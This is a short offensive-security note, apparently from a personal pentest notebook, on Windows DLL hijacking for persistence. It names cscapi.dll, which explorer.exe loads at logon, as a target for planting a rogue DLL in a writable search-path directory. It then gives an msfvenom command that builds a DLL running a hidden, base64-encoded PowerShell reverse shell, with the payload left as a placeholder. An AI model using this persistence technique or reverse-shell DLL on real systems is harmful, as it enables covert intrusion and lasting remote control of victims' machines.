**DLL hijacking** is a technique where a program loads a malicious DLL from a writable location due to how it searches for DLLs in directories listed in the `%PATH%` environment variable.

A notable dll for persistence is **`cscapi.dll`**, which can be hijacked because it's loaded by **`explorer.exe`** during user logon. Dropping a rogue `cscapi.dll` in a location like `C:\Windows`  if included in the search path and writable—can allow for **silent code execution and persistence**.
![[Pasted image 20250707233638.png]]

with msfvenom to get revshell
```bash
msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e <powershell b64 revshell payload>' EXITFUNC=none -f dll > x.dll
```
